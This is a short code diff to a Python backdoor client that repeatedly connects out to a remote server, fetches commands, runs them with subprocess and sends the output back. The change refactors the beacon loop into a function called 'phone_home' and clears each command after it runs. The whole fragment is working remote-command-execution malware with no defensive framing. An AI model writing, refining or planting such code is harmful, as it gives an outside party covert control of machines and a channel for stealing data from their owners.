@@ -13,7 +13,7 @@ rserver = (rhost, rport)
 cmd = []
 
 # Connect out and if server is up, retrieve a command and send back the stderr/stdout
-while True:
+def phone_home():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect(rserver)
@@ -33,7 +33,9 @@ while True:
                     execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                     s.sendall(bytes(execute.stdout, "utf-8"))
                     data = None
+                    cmd.remove((c))
 
 # Close socket and take a break.
-    s = None
+while True:
+    phone_home()
     time.sleep(wait)
